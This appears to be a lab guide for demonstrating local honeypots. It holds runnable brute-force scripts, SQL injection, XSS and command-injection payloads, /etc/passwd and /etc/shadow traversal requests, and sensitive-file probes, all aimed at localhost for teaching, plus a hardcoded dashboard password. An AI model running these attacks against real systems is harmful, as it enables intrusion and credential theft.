# Attack Simulation Guide

**Comprehensive guide for demonstrating honeypot functionality**  
*For instructor presentation and testing*

---

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [SSH Attack Simulations](#ssh-attack-simulations)
3. [Web Attack Simulations](#web-attack-simulations)
4. [FTP Attack Simulations](#ftp-attack-simulations)
5. [Automated Attack Scripts](#automated-attack-scripts)
6. [Verifying Captured Data](#verifying-captured-data)
7. [Real-World Attack Patterns](#real-world-attack-patterns)

---

## Prerequisites

Ensure honeypots are running:
```bash
cd /home/kali/Desktop/cys-project-final
docker compose ps
# All services should show "Up" status
```

Required tools (install if missing):
```bash
sudo apt update
sudo apt install -y openssh-client ftp curl hydra nmap jq
```

---

## SSH Attack Simulations

### Basic Connection Attempts
```bash
# Simple connection attempt (will fail authentication)
ssh -p 222 root@localhost

# Try common usernames
ssh -p 222 admin@localhost
ssh -p 222 ubuntu@localhost
ssh -p 222 pi@localhost
ssh -p 222 test@localhost
```

### Manual Brute Force Attack
```bash
# Try multiple passwords for root
sshpass -p 'password' ssh -p 222 root@localhost -o StrictHostKeyChecking=no
sshpass -p '123456' ssh -p 222 root@localhost -o StrictHostKeyChecking=no
sshpass -p 'admin' ssh -p 222 root@localhost -o StrictHostKeyChecking=no
sshpass -p 'root' ssh -p 222 root@localhost -o StrictHostKeyChecking=no
sshpass -p 'toor' ssh -p 222 root@localhost -o StrictHostKeyChecking=no
```

### Automated Brute Force with Hydra
```bash
# Create a password list
cat > /tmp/passwords.txt <<EOF
admin
password
123456
root
toor
letmein
welcome
qwerty
12345678
admin123
EOF

# Create a username list
cat > /tmp/usernames.txt <<EOF
root
admin
user
ubuntu
pi
test
EOF

# Run Hydra attack (limited to prevent excessive logs)
hydra -L /tmp/usernames.txt -P /tmp/passwords.txt ssh://localhost:222 -t 4 -V
```

### Command Injection Attempts
```bash
# After connection (manual interaction):
ssh -p 222 admin@localhost
# When prompted for password, press Ctrl+C and try:
# Password: '; cat /etc/passwd
# Password: $(whoami)
# Password: `id`
```

### SSH Key Probing
```bash
# Attempt key-based authentication
ssh-keygen -t rsa -f /tmp/test_key -N ""
ssh -p 222 -i /tmp/test_key root@localhost
```

---

## Web Attack Simulations

### Basic Reconnaissance
```bash
# Homepage
curl -i http://localhost/

# Robots.txt check
curl http://localhost/robots.txt

# Common admin paths
curl http://localhost/admin
curl http://localhost/administrator
curl http://localhost/admin.php
curl http://localhost/wp-admin/
curl http://localhost/administrator/
```

### Login Form Attacks
```bash
# Basic login attempt
curl -X POST http://localhost/login \
  -d "username=admin&password=admin123"

# SQL injection attempts
curl -X POST http://localhost/login \
  -d "username=admin' OR '1'='1&password=password"

curl -X POST http://localhost/login \
  -d "username=admin'--&password=anything"

# XSS attempts
curl -X POST http://localhost/login \
  -d "username=<script>alert('xss')</script>&password=test"

# Brute force common credentials
for user in admin root user administrator; do
  for pass in admin password 123456 admin123; do
    echo "Trying: $user / $pass"
    curl -s -X POST http://localhost/login \
      -d "username=$user&password=$pass" | head -c 100
    echo ""
  done
done
```

### Directory Traversal & File Inclusion
```bash
# Path traversal attempts
curl http://localhost/../../../etc/passwd
curl http://localhost/../../etc/shadow
curl "http://localhost/?file=../../../../etc/passwd"
curl "http://localhost/?page=../../../etc/passwd"
```

### Sensitive File Discovery
```bash
# Environment files
curl http://localhost/.env
curl http://localhost/.env.backup
curl http://localhost/.env.local

# Git repository exposure
curl http://localhost/.git/config
curl http://localhost/.git/HEAD
curl http://localhost/.git/logs/HEAD

# Backup files
curl http://localhost/backup.sql
curl http://localhost/backup.zip
curl http://localhost/database.sql

# Configuration files
curl http://localhost/config.php
curl http://localhost/config.inc.php
curl http://localhost/configuration.php
```

### CMS & Framework Probing
```bash
# WordPress
curl http://localhost/wp-login.php
curl http://localhost/wp-admin/
curl http://localhost/wp-content/
curl http://localhost/xmlrpc.php

# phpMyAdmin
curl http://localhost/phpmyadmin/
curl http://localhost/phpMyAdmin/
curl http://localhost/pma/
curl http://localhost/dbadmin/

# Joomla
curl http://localhost/administrator/
curl http://localhost/administrator/index.php

# Drupal
curl http://localhost/user/login
curl http://localhost/admin/
```

### API Endpoint Probing
```bash
# REST API discovery
curl http://localhost/api/
curl http://localhost/api/v1/status
curl http://localhost/api/v1/users
curl http://localhost/api/v2/admin

# GraphQL
curl -X POST http://localhost/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Common API paths
curl http://localhost/api/config
curl http://localhost/api/users
curl http://localhost/api/admin
curl http://localhost/rest/users
```

### User-Agent Spoofing
```bash
# Normal browser
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://localhost/

# Attack tools
curl -A "sqlmap/1.0" http://localhost/
curl -A "Nikto/2.1.6" http://localhost/
curl -A "Nmap Scripting Engine" http://localhost/

# Bots
curl -A "Googlebot/2.1" http://localhost/
curl -A "Baiduspider/2.0" http://localhost/
```

### HTTP Method Testing
```bash
# Different HTTP methods
curl -X GET http://localhost/admin
curl -X POST http://localhost/admin
curl -X PUT http://localhost/admin
curl -X DELETE http://localhost/admin
curl -X OPTIONS http://localhost/admin
curl -X TRACE http://localhost/admin
curl -X PATCH http://localhost/admin
```

---

## FTP Attack Simulations

### Anonymous Login Attempts
```bash
# Anonymous FTP
ftp localhost 211
# Username: anonymous
# Password: (press Enter)
# Commands: ls, pwd, quit
```

### Automated FTP Testing
```bash
# Using lftp
lftp -u anonymous, -p 211 localhost <<EOF
ls
pwd
quit
EOF

# Using curl
curl ftp://localhost:211/
curl ftp://anonymous:@localhost:211/
```

### FTP Brute Force
```bash
# Create credentials list
cat > /tmp/ftp_users.txt <<EOF
admin
ftp
user
root
test
EOF

cat > /tmp/ftp_passwords.txt <<EOF
admin
password
ftp
123456
root
EOF

# Hydra FTP attack
hydra -L /tmp/ftp_users.txt -P /tmp/ftp_passwords.txt ftp://localhost:211 -t 4
```

### FTP Directory Traversal
```bash
ftp localhost 211
# After login:
# cd ../../../etc
# cd /etc/passwd
# get passwd
```

### FTP Upload Attempts
```bash
# Create test file
echo "test upload" > /tmp/test.txt

ftp localhost 211 <<EOF
anonymous

put /tmp/test.txt
ls
quit
EOF
```

---

## Automated Attack Scripts

### Comprehensive SSH Attack Script
```bash
#!/bin/bash
# ssh_attack_simulation.sh

echo "[*] Starting SSH attack simulation..."

USERS=("root" "admin" "user" "ubuntu" "test")
PASSWORDS=("password" "123456" "admin" "root" "letmein")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[+] Attempting: $user:$pass"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -p 222 $user@localhost "echo test" 2>/dev/null
        sleep 0.5
    done
done

echo "[*] SSH simulation complete"
```

### Comprehensive Web Attack Script
```bash
#!/bin/bash
# web_attack_simulation.sh

echo "[*] Starting web attack simulation..."

# Admin path scanning
ADMIN_PATHS=("admin" "administrator" "wp-admin" "phpmyadmin" "admin.php" "login.php")
for path in "${ADMIN_PATHS[@]}"; do
    echo "[+] Probing: /$path"
    curl -s http://localhost/$path > /dev/null
    sleep 0.3
done

# Login attempts
echo "[+] Simulating login attacks..."
USERS=("admin" "root" "user")
PASSWORDS=("admin" "password" "123456")
for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "[+] Login attempt: $user:$pass"
        curl -s -X POST http://localhost/login \
            -d "username=$user&password=$pass" > /dev/null
        sleep 0.3
    done
done

# Sensitive file discovery
echo "[+] Probing sensitive files..."
SENSITIVE=(".env" ".git/config" "config.php" "backup.sql" "phpinfo.php")
for file in "${SENSITIVE[@]}"; do
    echo "[+] Requesting: /$file"
    curl -s http://localhost/$file > /dev/null
    sleep 0.3
done

echo "[*] Web simulation complete"
```

### Combined Attack Script
```bash
#!/bin/bash
# combined_attack_simulation.sh

echo "[*] Starting combined attack simulation on all honeypots..."
echo ""

# SSH Attacks
echo "=== SSH Attacks ==="
for i in {1..10}; do
    sshpass -p "password$i" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=2 -p 222 root@localhost 2>/dev/null &
done
sleep 2

# Web Attacks
echo "=== Web Attacks ==="
for i in {1..20}; do
    curl -s http://localhost/ > /dev/null &
    curl -s http://localhost/admin > /dev/null &
    curl -s http://localhost/.env > /dev/null &
done
wait

# FTP Attacks
echo "=== FTP Attacks ==="
for i in {1..5}; do
    curl -s ftp://anonymous:@localhost:211/ > /dev/null &
done
wait

echo ""
echo "[*] Combined simulation complete"
echo "[*] Check logs and dashboards for captured data"
```

Save and make executable:
```bash
chmod +x ssh_attack_simulation.sh web_attack_simulation.sh combined_attack_simulation.sh
```

---

## Verifying Captured Data

### View SSH Logs
```bash
# Real-time monitoring
tail -f logs/ssh-honeypot/ssh_honeypot.json

# Count attacks
cat logs/ssh-honeypot/ssh_honeypot.json | jq -s 'length'

# Top usernames
jq -r '.username' logs/ssh-honeypot/ssh_honeypot.json | sort | uniq -c | sort -rn | head -10

# Top passwords
jq -r '.password' logs/ssh-honeypot/ssh_honeypot.json | sort | uniq -c | sort -rn | head -10

# Attack timeline
jq -r '[.timestamp, .username, .password] | @tsv' logs/ssh-honeypot/ssh_honeypot.json | head -20
```

### View Web Logs
```bash
# Real-time monitoring
tail -f logs/web-honeypot/honeypot.json

# Count requests
cat logs/web-honeypot/honeypot.json | jq -s 'length'

# Top paths accessed
jq -r '.path' logs/web-honeypot/honeypot.json | sort | uniq -c | sort -rn | head -10

# Login attempts
jq -r 'select(.path=="/login") | [.timestamp, .form_data.username, .form_data.password] | @tsv' \
    logs/web-honeypot/honeypot.json

# Top user agents
jq -r '.user_agent' logs/web-honeypot/honeypot.json | sort | uniq -c | sort -rn | head -10
```

### View FTP Logs
```bash
# List Dionaea logs
ls -lah logs/dionaea/

# Monitor Dionaea activity
tail -f logs/dionaea/*.log 2>/dev/null || echo "Start FTP attacks to generate logs"
```

### Docker Container Logs
```bash
# All containers
docker compose logs -f

# Specific honeypot
docker compose logs -f ssh-honeypot
docker compose logs -f web-honeypot
docker compose logs -f dionaea

# Last 50 lines
docker compose logs --tail=50 ssh-honeypot
```

---

## Real-World Attack Patterns

### Botnet Simulation
```bash
# Simulate multiple IPs attacking (uses different source ports)
for i in {1..50}; do
    sshpass -p "botnet$i" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=1 -p 222 root@localhost 2>/dev/null &
done
wait
```

### Slow Scan Simulation
```bash
# Gradual reconnaissance over time
for path in / /admin /login /api /phpmyadmin /wp-admin; do
    echo "[$(date)] Scanning: $path"
    curl -s http://localhost$path > /dev/null
    sleep 30  # Wait 30 seconds between requests
done
```

### Credential Stuffing
```bash
# Simulate credential stuffing attack with leaked passwords
curl -X POST http://localhost/login -d "username=admin@example.com&password=linkedin123"
sleep 1
curl -X POST http://localhost/login -d "username=user@example.com&password=facebook2021"
sleep 1
curl -X POST http://localhost/login -d "username=test@test.com&password=adobe2013"
```

### Exploit Scanner Simulation
```bash
# Simulate automated vulnerability scanner
EXPLOITS=(
    "wp-content/plugins/vulnerable-plugin/"
    "admin/config.php"
    "cgi-bin/test.cgi"
    "servlet/admin"
    "manager/html"
    "phpmyadmin/scripts/setup.php"
)

for exploit in "${EXPLOITS[@]}"; do
    curl -A "Acunetix/13.0" http://localhost/$exploit
    sleep 2
done
```

---

## Demonstration Workflow (For Instructor)

### Step 1: Show Clean State
```bash
# Show empty or minimal logs
ls -lah logs/ssh-honeypot/
ls -lah logs/web-honeypot/
```

### Step 2: Run Attacks
```bash
# Terminal 1: Monitor logs
watch -n 1 'tail -5 logs/ssh-honeypot/ssh_honeypot.json'

# Terminal 2: Execute attacks
./combined_attack_simulation.sh
```

### Step 3: Show Captured Data
```bash
# Statistics
echo "=== SSH Attacks ==="
jq -s 'length' logs/ssh-honeypot/ssh_honeypot.json
echo "=== Web Attacks ==="
jq -s 'length' logs/web-honeypot/honeypot.json
```

### Step 4: Open Grafana
```bash
# Open browser to dashboards
xdg-open http://localhost:3000
# Login: admin / honeypot123
# Navigate through SSH, Web, FTP, and Combined dashboards
```

---

## Safety Notes

⚠️ **Important**: These simulations should only be run in controlled lab environments.

- Do NOT run these attacks against production systems
- Keep honeypots isolated from sensitive networks
- Monitor resource usage during bulk attacks
- Clean logs between demonstrations if needed: `rm logs/*/*.json`

---

## Quick Demo Commands (Copy/Paste)

```bash
# 1-minute quick demo
ssh -p 222 admin@localhost  # Try password: admin123
curl http://localhost/admin
curl -X POST http://localhost/login -d "username=admin&password=test"
curl http://localhost/.env
ftp localhost 211  # Username: anonymous

# Check results
jq -s 'length' logs/ssh-honeypot/ssh_honeypot.json
jq -s 'length' logs/web-honeypot/honeypot.json
```
